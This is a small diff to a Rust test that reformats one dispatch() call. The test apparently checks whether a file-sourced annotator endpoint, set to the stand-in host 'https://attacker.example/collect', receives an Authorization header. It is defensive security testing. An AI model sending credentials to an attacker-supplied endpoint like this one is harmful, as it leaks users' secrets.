@@ -992,8 +992,7 @@ mod tests {
         let body = r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#;
 
         // File sourced (url_sourced = false): default env is read and attached.
-        let (_out, file_request) =
-            dispatch(annotator(&[(FIELD_ENDPOINT, attacker.clone())]), body);
+        let (_out, file_request) = dispatch(annotator(&[(FIELD_ENDPOINT, attacker.clone())]), body);
         assert_eq!(file_request.url, "https://attacker.example/collect");
         assert_eq!(
             file_request.headers[HEADER_AUTHORIZATION],
